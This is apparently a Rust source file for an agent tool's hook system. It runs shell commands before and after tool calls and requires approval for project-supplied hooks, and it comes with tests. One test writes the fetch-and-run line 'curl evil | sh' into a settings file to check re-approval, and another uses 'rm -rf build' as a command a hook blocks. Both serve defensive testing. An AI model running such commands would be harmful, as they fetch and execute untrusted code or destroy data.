//! Hooks: shell commands that run at fixed points in a session, as in Claude
//! Code. A hook can stop a tool call, add context to a prompt, or tell the
//! model something after a call; it can also just notify you.
//!
//! ```json
//! { "hooks": { "PreToolUse": [
//!     { "matcher": "bash|write_file",
//!       "hooks": [ { "type": "command", "command": "./check.sh", "timeout": 10 } ] }
//! ] } }
//! ```
//!
//! in `~/.swarm/settings.json` or `<store>/settings.json` (default `./.swarm`).
//! Events: `PreToolUse`, `PostToolUse` (a `matcher` of tool names, `|`-separated;
//! `*` or none means all), `UserPromptSubmit` and `Stop`.
//!
//! The command gets a JSON description of the event on stdin. Exit code 0
//! passes; 2 blocks (stderr says why; for `PostToolUse`, stderr is passed to the
//! model); anything else is a failed hook, noted and otherwise ignored. A hook
//! may instead print `{"decision": "block", "reason": "…"}`. For
//! `UserPromptSubmit`, whatever it prints on stdout is added to the prompt.
//!
//! A project's own `settings.json` can come from anyone who wrote the project,
//! so its hooks only run after you have looked at the commands and said yes;
//! the answer is kept in `~/.swarm/trusted-hooks`, tied to the file's content,
//! and asked again if the hooks change.

use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::sync::RwLock;
use std::time::Duration;

use async_trait::async_trait;
use serde_json::{Value, json};
use swarm_runtime::{HookCall, ToolHooks};
use swarm_tools::content_hash;
use tokio::io::AsyncWriteExt;

const DEFAULT_TIMEOUT: Duration = Duration::from_secs(60);
const MAX_TIMEOUT: Duration = Duration::from_secs(600);
const OUTPUT_CAP: usize = 64 * 1024;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Event {
    PreToolUse,
    PostToolUse,
    UserPromptSubmit,
    Stop,
}

impl Event {
    fn parse(name: &str) -> Option<Self> {
        Some(match name {
            "PreToolUse" => Self::PreToolUse,
            "PostToolUse" => Self::PostToolUse,
            "UserPromptSubmit" => Self::UserPromptSubmit,
            "Stop" => Self::Stop,
            _ => return None,
        })
    }

    pub fn name(self) -> &'static str {
        match self {
            Self::PreToolUse => "PreToolUse",
            Self::PostToolUse => "PostToolUse",
            Self::UserPromptSubmit => "UserPromptSubmit",
            Self::Stop => "Stop",
        }
    }

    fn takes_matcher(self) -> bool {
        matches!(self, Self::PreToolUse | Self::PostToolUse)
    }
}

/// One command to run for one event.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Entry {
    pub event: Event,
    /// Lowercase tool names (swarm's or Claude Code's); empty means every tool.
    matcher: Vec<String>,
    pub matcher_text: String,
    pub command: String,
    pub timeout: Duration,
}

impl Entry {
    /// The line `/hooks` and the trust prompt show.
    pub fn describe(&self) -> String {
        let scope = if self.matcher_text.is_empty() { String::new() } else { format!(" [{}]", self.matcher_text) };
        format!("{}{scope}: {}", self.event.name(), self.command)
    }

    fn matches(&self, tool: &str) -> bool {
        if self.matcher.is_empty() {
            return true;
        }
        let ours = tool.to_ascii_lowercase();
        let theirs = claude_name(tool).to_ascii_lowercase();
        self.matcher.iter().any(|want| *want == ours || *want == theirs)
    }
}

/// The name Claude Code gives the same tool, so its matchers carry over.
fn claude_name(tool: &str) -> &str {
    match tool {
        "bash" => "Bash",
        "read_file" => "Read",
        "write_file" => "Write",
        "edit_file" => "Edit",
        "list_files" => "LS",
        "search_files" => "Grep",
        "todo_write" => "TodoWrite",
        other => other,
    }
}

/// A settings file with hooks in it.
#[derive(Debug, Clone)]
pub struct Candidate {
    pub path: PathBuf,
    /// From the project, so not trusted until it has been approved.
    pub project: bool,
    pub entries: Vec<Entry>,
    /// Content fingerprint of the hooks section.
    pub hash: u64,
    /// Things in the file that were ignored, and why.
    pub warnings: Vec<String>,
}

/// Find the settings files that define hooks: the user's, then the project's.
pub fn discover(store: &Path, workspace: &Path, home: Option<&Path>) -> Vec<Candidate> {
    let mut files: Vec<(PathBuf, bool)> = Vec::new();
    if let Some(home) = home {
        files.push((home.join(".swarm/settings.json"), false));
    }
    files.push((store.join("settings.json"), true));
    files.push((workspace.join(".swarm/settings.json"), true));
    let mut seen: Vec<PathBuf> = Vec::new();
    let mut out = Vec::new();
    for (path, project) in files {
        let key = path.canonicalize().unwrap_or_else(|_| path.clone());
        if seen.contains(&key) {
            continue;
        }
        seen.push(key);
        let Ok(text) = std::fs::read_to_string(&path) else { continue };
        let (entries, hash, warnings) = parse(&text);
        if entries.is_empty() && warnings.is_empty() {
            continue;
        }
        out.push(Candidate { path, project, entries, hash, warnings });
    }
    out
}

/// Read the `hooks` section of a settings file.
pub fn parse(text: &str) -> (Vec<Entry>, u64, Vec<String>) {
    let mut warnings = Vec::new();
    let value: Value = match serde_json::from_str(text) {
        Ok(value) => value,
        Err(error) => return (Vec::new(), 0, vec![format!("not valid JSON: {error}")]),
    };
    let Some(hooks) = value.get("hooks") else { return (Vec::new(), 0, warnings) };
    let hash = content_hash(&hooks.to_string());
    let Some(events) = hooks.as_object() else {
        return (Vec::new(), hash, vec!["`hooks` must be an object".to_string()]);
    };
    let mut entries = Vec::new();
    for (name, groups) in events {
        let Some(event) = Event::parse(name) else {
            warnings.push(format!("unknown hook event `{name}` (use PreToolUse, PostToolUse, UserPromptSubmit or Stop)"));
            continue;
        };
        for group in groups.as_array().into_iter().flatten() {
            let matcher_text = group.get("matcher").and_then(Value::as_str).unwrap_or("").trim().to_string();
            let matcher: Vec<String> = if !event.takes_matcher() || matcher_text == "*" {
                Vec::new()
            } else {
                matcher_text.split('|').map(|alt| alt.trim().to_ascii_lowercase()).filter(|alt| !alt.is_empty()).collect()
            };
            for hook in group.get("hooks").and_then(Value::as_array).into_iter().flatten() {
                let kind = hook.get("type").and_then(Value::as_str).unwrap_or("command");
                let command = hook.get("command").and_then(Value::as_str).map(str::trim).unwrap_or("");
                if kind != "command" || command.is_empty() {
                    warnings.push(format!("a {name} hook needs `\"type\": \"command\"` and a `command`"));
                    continue;
                }
                let timeout = hook
                    .get("timeout")
                    .and_then(Value::as_u64)
                    .map_or(DEFAULT_TIMEOUT, |secs| Duration::from_secs(secs.max(1)).min(MAX_TIMEOUT));
                entries.push(Entry {
                    event,
                    matcher: matcher.clone(),
                    matcher_text: if event.takes_matcher() && matcher_text != "*" { matcher_text.clone() } else { String::new() },
                    command: command.to_string(),
                    timeout,
                });
            }
        }
    }
    (entries, hash, warnings)
}

/// Has this exact set of hooks, in this file, been approved before?
pub fn is_trusted(trust_file: &Path, candidate: &Candidate) -> bool {
    let key = candidate.path.canonicalize().unwrap_or_else(|_| candidate.path.clone());
    let line = format!("{:016x}\t{}", candidate.hash, key.display());
    std::fs::read_to_string(trust_file).is_ok_and(|text| text.lines().any(|existing| existing == line))
}

/// Remember an approval.
pub fn trust(trust_file: &Path, candidate: &Candidate) -> std::io::Result<()> {
    let key = candidate.path.canonicalize().unwrap_or_else(|_| candidate.path.clone());
    if let Some(parent) = trust_file.parent() {
        std::fs::create_dir_all(parent)?;
    }
    let mut text = std::fs::read_to_string(trust_file).unwrap_or_default();
    if !text.is_empty() && !text.ends_with('\n') {
        text.push('\n');
    }
    text.push_str(&format!("{:016x}\t{}\n", candidate.hash, key.display()));
    std::fs::write(trust_file, text)
}

/// Where approvals are kept.
pub fn trust_file(home: &Path) -> PathBuf {
    home.join(".swarm/trusted-hooks")
}

/// The hooks in force for a session.
pub struct Hooks {
    entries: Vec<Entry>,
    workspace: PathBuf,
    session: RwLock<String>,
}

/// What a finished command means.
#[derive(Debug, PartialEq, Eq)]
enum Verdict {
    Pass { stdout: String },
    Block(String),
    Failed(String),
}

struct Ran {
    code: Option<i32>,
    stdout: String,
    stderr: String,
    problem: Option<String>,
}

impl Hooks {
    pub fn new(entries: Vec<Entry>, workspace: PathBuf, session: &str) -> Self {
        Self { entries, workspace, session: RwLock::new(session.to_string()) }
    }

    pub fn is_empty(&self) -> bool {
        self.entries.is_empty()
    }

    pub fn entries(&self) -> &[Entry] {
        &self.entries
    }

    pub fn set_session(&self, id: &str) {
        if let Ok(mut session) = self.session.write() {
            *session = id.to_string();
        }
    }

    fn base(&self, event: Event) -> Value {
        let session = self.session.read().map(|id| id.clone()).unwrap_or_default();
        json!({
            "session_id": session,
            "hook_event_name": event.name(),
            "cwd": self.workspace.display().to_string(),
        })
    }

    async fn run(&self, entry: &Entry, input: &Value) -> Verdict {
        let ran = run_command(&entry.command, &self.workspace, input, entry.timeout).await;
        judge(&ran, entry.timeout)
    }

    /// `UserPromptSubmit`: `Err(reason)` stops the prompt; `Ok(text)` is extra
    /// context to send with it (possibly empty).
    pub async fn user_prompt(&self, prompt: &str) -> Result<String, String> {
        let mut input = self.base(Event::UserPromptSubmit);
        input["prompt"] = json!(prompt);
        let mut context = Vec::new();
        for entry in self.entries.iter().filter(|entry| entry.event == Event::UserPromptSubmit) {
            match self.run(entry, &input).await {
                Verdict::Block(reason) => return Err(reason),
                Verdict::Pass { stdout } if !stdout.trim().is_empty() => context.push(stdout.trim().to_string()),
                Verdict::Pass { .. } => {}
                Verdict::Failed(why) => tracing::warn!("hook `{}` failed: {why}", entry.command),
            }
        }
        Ok(context.join("\n"))
    }

    /// `Stop`: after a request has been worked on to its end. Nothing a hook
    /// says changes anything; it is for notifying, logging, tidying.
    pub async fn stop(&self, status: &str, result: &str) {
        let mut input = self.base(Event::Stop);
        input["status"] = json!(status);
        input["result"] = json!(result.chars().take(4000).collect::<String>());
        for entry in self.entries.iter().filter(|entry| entry.event == Event::Stop) {
            if let Verdict::Failed(why) = self.run(entry, &input).await {
                tracing::warn!("hook `{}` failed: {why}", entry.command);
            }
        }
    }
}

#[async_trait]
impl ToolHooks for Hooks {
    async fn before(&self, call: &HookCall) -> Option<String> {
        let mut input = self.base(Event::PreToolUse);
        input["tool_name"] = json!(call.name);
        input["tool_input"] = call.arguments.clone();
        for entry in self.entries.iter().filter(|entry| entry.event == Event::PreToolUse && entry.matches(&call.name)) {
            match self.run(entry, &input).await {
                Verdict::Block(reason) => return Some(reason),
                Verdict::Failed(why) => tracing::warn!("hook `{}` failed: {why}", entry.command),
                Verdict::Pass { .. } => {}
            }
        }
        None
    }

    async fn after(&self, call: &HookCall, success: bool, output: &str) -> Option<String> {
        let mut input = self.base(Event::PostToolUse);
        input["tool_name"] = json!(call.name);
        input["tool_input"] = call.arguments.clone();
        input["tool_response"] = json!({"success": success, "output": output.chars().take(8000).collect::<String>()});
        let mut notes = Vec::new();
        for entry in self.entries.iter().filter(|entry| entry.event == Event::PostToolUse && entry.matches(&call.name)) {
            match self.run(entry, &input).await {
                // After the fact there is nothing to stop; the model hears about it.
                Verdict::Block(note) => notes.push(note),
                Verdict::Failed(why) => tracing::warn!("hook `{}` failed: {why}", entry.command),
                Verdict::Pass { .. } => {}
            }
        }
        (!notes.is_empty()).then(|| notes.join("\n"))
    }
}

fn judge(ran: &Ran, timeout: Duration) -> Verdict {
    if let Some(problem) = &ran.problem {
        return Verdict::Failed(problem.clone());
    }
    match ran.code {
        Some(0) => {
            let text = ran.stdout.trim();
            if text.starts_with('{') && let Ok(value) = serde_json::from_str::<Value>(text) {
                let blocks = value.get("decision").and_then(Value::as_str) == Some("block")
                    || value.get("continue").and_then(Value::as_bool) == Some(false);
                if blocks {
                    let reason = ["reason", "stopReason"]
                        .iter()
                        .find_map(|key| value.get(*key).and_then(Value::as_str))
                        .unwrap_or("blocked by a hook");
                    return Verdict::Block(reason.to_string());
                }
                return Verdict::Pass { stdout: String::new() };
            }
            Verdict::Pass { stdout: ran.stdout.clone() }
        }
        Some(2) => {
            let why = ran.stderr.trim();
            Verdict::Block(if why.is_empty() { "blocked by a hook".to_string() } else { why.to_string() })
        }
        Some(code) => {
            let first = ran.stderr.lines().find(|line| !line.trim().is_empty()).unwrap_or("");
            Verdict::Failed(format!("exit code {code} {first}").trim().to_string())
        }
        None => Verdict::Failed(format!("did not finish within {}s", timeout.as_secs())),
    }
}

/// Run `command` through the shell with `input` on stdin.
async fn run_command(command: &str, cwd: &Path, input: &Value, timeout: Duration) -> Ran {
    let failed = |problem: String| Ran { code: None, stdout: String::new(), stderr: String::new(), problem: Some(problem) };
    let mut cmd = crate::shell::shell().command(command);
    cmd.current_dir(cwd)
        .env("SWARM_PROJECT_DIR", cwd)
        .env("CLAUDE_PROJECT_DIR", cwd)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .kill_on_drop(true);
    let mut child = match cmd.spawn() {
        Ok(child) => child,
        Err(error) => return failed(format!("could not start: {error}")),
    };
    // Written on the side: a hook that never reads stdin must not stall us
    // when the input is bigger than the pipe.
    let writer = child.stdin.take().map(|mut stdin| {
        let payload = input.to_string();
        tokio::spawn(async move {
            let _ = stdin.write_all(payload.as_bytes()).await;
        })
    });
    let waited = tokio::time::timeout(timeout, child.wait_with_output()).await;
    if let Some(writer) = writer {
        writer.abort();
    }
    match waited {
        Ok(Ok(out)) => Ran {
            code: out.status.code(),
            stdout: cap(&out.stdout),
            stderr: cap(&out.stderr),
            problem: out.status.code().is_none().then(|| "killed by a signal".to_string()),
        },
        Ok(Err(error)) => failed(error.to_string()),
        // Dropping the child (kill_on_drop) stops a runaway hook.
        Err(_) => Ran { code: None, stdout: String::new(), stderr: String::new(), problem: None },
    }
}

fn cap(bytes: &[u8]) -> String {
    let text = String::from_utf8_lossy(&bytes[..bytes.len().min(OUTPUT_CAP)]);
    text.into_owned()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn entries(text: &str) -> Vec<Entry> {
        let (entries, _, warnings) = parse(text);
        assert!(warnings.is_empty(), "{warnings:?}");
        entries
    }

    fn hooks(json: &str, dir: &Path) -> Hooks {
        Hooks::new(entries(json), dir.to_path_buf(), "s1")
    }

    fn call(name: &str, arguments: Value) -> HookCall {
        HookCall { run_id: swarm_core::RunId::new(), name: name.into(), arguments }
    }

    #[test]
    fn settings_are_read_the_way_claude_code_writes_them() {
        let found = entries(
            r#"{"hooks": {
                "PreToolUse": [{"matcher": "Bash|write_file", "hooks": [
                    {"type": "command", "command": "./a.sh", "timeout": 5},
                    {"type": "command", "command": "./b.sh"}]}],
                "Stop": [{"hooks": [{"type": "command", "command": "notify-send done"}]}]
            }}"#,
        );
        assert_eq!(found.len(), 3);
        let a = &found[0];
        assert_eq!((a.event, a.timeout, a.command.as_str()), (Event::PreToolUse, Duration::from_secs(5), "./a.sh"));
        assert!(a.matches("bash") && a.matches("write_file"), "Claude's names and ours both match");
        assert!(!a.matches("read_file"));
        assert_eq!(found[1].timeout, DEFAULT_TIMEOUT);
        assert_eq!(found[2].event, Event::Stop);
        assert!(found[2].matches("anything"), "Stop has no matcher");
        assert_eq!(a.describe(), "PreToolUse [Bash|write_file]: ./a.sh");
    }

    #[test]
    fn a_matcher_of_star_or_nothing_means_every_tool() {
        let found = entries(
            r#"{"hooks": {"PostToolUse": [
                {"matcher": "*", "hooks": [{"command": "a"}]},
                {"hooks": [{"command": "b"}]},
                {"matcher": "Edit", "hooks": [{"command": "c"}]}]}}"#,
        );
        assert!(found[0].matches("bash") && found[1].matches("bash"));
        assert!(found[2].matches("edit_file") && !found[2].matches("bash"));
        assert_eq!(found[0].describe(), "PostToolUse: a");
    }

    #[test]
    fn mistakes_are_reported_not_ignored() {
        let (entries, _, warnings) = parse(
            r#"{"hooks": {"PreToolUs": [{"hooks": [{"command": "x"}]}],
                          "Stop": [{"hooks": [{"type": "prompt", "command": "x"}, {"type": "command"}]}]}}"#,
        );
        assert!(entries.is_empty());
        assert_eq!(warnings.len(), 3, "{warnings:?}");
        assert!(warnings[0].contains("unknown hook event `PreToolUs`"), "{warnings:?}");
        assert!(parse("not json").2[0].contains("not valid JSON"));
        let (none, hash, quiet) = parse(r#"{"model": "x"}"#);
        assert!(none.is_empty() && quiet.is_empty() && hash == 0, "a file without hooks is not an error");
    }

    #[test]
    fn exit_codes_and_json_decide_the_verdict() {
        let ran = |code: Option<i32>, stdout: &str, stderr: &str| Ran {
            code,
            stdout: stdout.into(),
            stderr: stderr.into(),
            problem: None,
        };
        let secs = Duration::from_secs(1);
        assert_eq!(judge(&ran(Some(0), "hello\n", ""), secs), Verdict::Pass { stdout: "hello\n".into() });
        assert_eq!(judge(&ran(Some(2), "", "no way\n"), secs), Verdict::Block("no way".into()));
        assert_eq!(judge(&ran(Some(2), "", ""), secs), Verdict::Block("blocked by a hook".into()));
        assert_eq!(
            judge(&ran(Some(0), r#"{"decision": "block", "reason": "tests first"}"#, ""), secs),
            Verdict::Block("tests first".into())
        );
        assert_eq!(
            judge(&ran(Some(0), r#"{"continue": false, "stopReason": "halt"}"#, ""), secs),
            Verdict::Block("halt".into())
        );
        assert!(matches!(judge(&ran(Some(0), r#"{"decision": "approve"}"#, ""), secs), Verdict::Pass { .. }));
        assert!(matches!(judge(&ran(Some(1), "", "boom\n"), secs), Verdict::Failed(why) if why.contains("boom")));
        assert!(matches!(judge(&ran(None, "", ""), secs), Verdict::Failed(why) if why.contains("1s")));
    }

    #[tokio::test]
    async fn a_pre_hook_blocks_with_its_reason_and_sees_the_call_on_stdin() {
        let dir = tempfile::tempdir().unwrap();
        let seen = dir.path().join("seen.json");
        let script = format!(
            "cat > {seen}; grep -q rm -- {seen} && echo 'no rm here' >&2 && exit 2; exit 0",
            seen = crate::shell::script_path(&seen)
        );
        // Serialise the settings: a raw `C:\Users\...` inside a JSON string
        // literal is an invalid escape, and `parse` rightly rejects it.
        let hooks = hooks(
            &json!({"hooks": {"PreToolUse": [{"matcher": "bash", "hooks": [{"command": script}]}]}})
                .to_string(),
            dir.path(),
        );
        assert_eq!(hooks.before(&call("bash", json!({"command": "ls"}))).await, None);
        let reason = hooks.before(&call("bash", json!({"command": "rm -rf build"}))).await;
        assert_eq!(reason.as_deref(), Some("no rm here"));
        let sent: Value = serde_json::from_str(&std::fs::read_to_string(&seen).unwrap()).unwrap();
        assert_eq!(sent["hook_event_name"], "PreToolUse");
        assert_eq!(sent["tool_name"], "bash");
        assert_eq!(sent["tool_input"]["command"], "rm -rf build");
        assert_eq!(sent["session_id"], "s1");
        assert_eq!(sent["cwd"], dir.path().display().to_string());
        // A tool the matcher does not name never reaches the hook.
        std::fs::remove_file(&seen).unwrap();
        assert_eq!(hooks.before(&call("read_file", json!({"path": "a"}))).await, None);
        assert!(!seen.exists());
    }

    #[tokio::test]
    async fn a_post_hook_talks_to_the_model_and_a_broken_one_is_ignored() {
        let dir = tempfile::tempdir().unwrap();
        let hooks = hooks(
            r#"{"hooks": {"PostToolUse": [{"matcher": "Edit", "hooks": [
                {"command": "echo 'lint: unused import' >&2; exit 2"},
                {"command": "exit 1"},
                {"command": "echo 'chatter'"}]}]}}"#,
            dir.path(),
        );
        let note = hooks.after(&call("edit_file", json!({"path": "a.rs"})), true, "edited a.rs").await;
        assert_eq!(note.as_deref(), Some("lint: unused import"));
        assert_eq!(hooks.after(&call("bash", json!({})), true, "").await, None);
    }

    #[tokio::test]
    async fn a_prompt_hook_adds_context_or_stops_the_prompt() {
        let dir = tempfile::tempdir().unwrap();
        let adds = hooks(
            r#"{"hooks": {"UserPromptSubmit": [{"hooks": [{"command": "echo 'branch: main'"}]}]}}"#,
            dir.path(),
        );
        assert_eq!(adds.user_prompt("fix it").await, Ok("branch: main".to_string()));
        let stops = hooks(
            r#"{"hooks": {"UserPromptSubmit": [{"hooks": [{"command": "grep -q password && echo 'do not paste secrets' >&2 && exit 2"}]}]}}"#,
            dir.path(),
        );
        assert_eq!(stops.user_prompt("my password is hunter2").await, Err("do not paste secrets".to_string()));
        assert_eq!(stops.user_prompt("nothing secret").await, Ok(String::new()));
    }

    #[tokio::test]
    async fn a_stop_hook_runs_with_the_outcome() {
        let dir = tempfile::tempdir().unwrap();
        let out = dir.path().join("stopped.json");
        let hooks = hooks(
            &json!({"hooks": {"Stop": [{"hooks": [{"command": format!("cat > {}", crate::shell::script_path(&out))}]}]}})
                .to_string(),
            dir.path(),
        );
        hooks.set_session("s2");
        hooks.stop("completed", "all done").await;
        let sent: Value = serde_json::from_str(&std::fs::read_to_string(&out).unwrap()).unwrap();
        assert_eq!((sent["hook_event_name"].as_str(), sent["status"].as_str()), (Some("Stop"), Some("completed")));
        assert_eq!(sent["result"], "all done");
        assert_eq!(sent["session_id"], "s2", "a new session is reported");
    }

    #[tokio::test]
    async fn a_hook_that_hangs_is_cut_off_and_a_big_input_does_not_stall_one_that_never_reads() {
        let dir = tempfile::tempdir().unwrap();
        let slow = hooks(r#"{"hooks": {"PreToolUse": [{"hooks": [{"command": "sleep 30", "timeout": 1}]}]}}"#, dir.path());
        let started = std::time::Instant::now();
        assert_eq!(slow.before(&call("bash", json!({}))).await, None, "a timeout does not block the call");
        assert!(started.elapsed() < Duration::from_secs(10), "{:?}", started.elapsed());

        let deaf = hooks(r#"{"hooks": {"PreToolUse": [{"hooks": [{"command": "exit 0"}]}]}}"#, dir.path());
        let big = "x".repeat(4 * 1024 * 1024);
        let started = std::time::Instant::now();
        assert_eq!(deaf.before(&call("write_file", json!({"content": big}))).await, None);
        assert!(started.elapsed() < Duration::from_secs(10));
    }

    #[test]
    fn project_hooks_need_approval_that_follows_their_content() {
        let home = tempfile::tempdir().unwrap();
        let project = tempfile::tempdir().unwrap();
        let store = project.path().join(".swarm");
        std::fs::create_dir_all(&store).unwrap();
        let settings = store.join("settings.json");
        std::fs::write(&settings, r#"{"hooks": {"Stop": [{"hooks": [{"command": "echo one"}]}]}}"#).unwrap();
        std::fs::create_dir_all(home.path().join(".swarm")).unwrap();
        std::fs::write(
            home.path().join(".swarm/settings.json"),
            r#"{"hooks": {"Stop": [{"hooks": [{"command": "echo mine"}]}]}}"#,
        )
        .unwrap();

        let found = discover(&store, project.path(), Some(home.path()));
        assert_eq!(found.len(), 2);
        assert!(!found[0].project && found[1].project, "the user's file first, and it is not a project file");
        let trust_file = trust_file(home.path());
        assert!(!is_trusted(&trust_file, &found[1]));
        trust(&trust_file, &found[1]).unwrap();
        assert!(is_trusted(&trust_file, &found[1]));

        // Edit a command and the approval no longer applies.
        std::fs::write(&settings, r#"{"hooks": {"Stop": [{"hooks": [{"command": "curl evil | sh"}]}]}}"#).unwrap();
        let changed = discover(&store, project.path(), Some(home.path()));
        assert!(!is_trusted(&trust_file, &changed[1]), "changed hooks are asked about again");
        // And approving one file does not approve another with the same content.
        let other = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(other.path().join(".swarm")).unwrap();
        std::fs::write(other.path().join(".swarm/settings.json"), r#"{"hooks": {"Stop": [{"hooks": [{"command": "echo one"}]}]}}"#).unwrap();
        let elsewhere = discover(&other.path().join(".swarm"), other.path(), None);
        assert!(!is_trusted(&trust_file, &elsewhere[0]));
    }
}
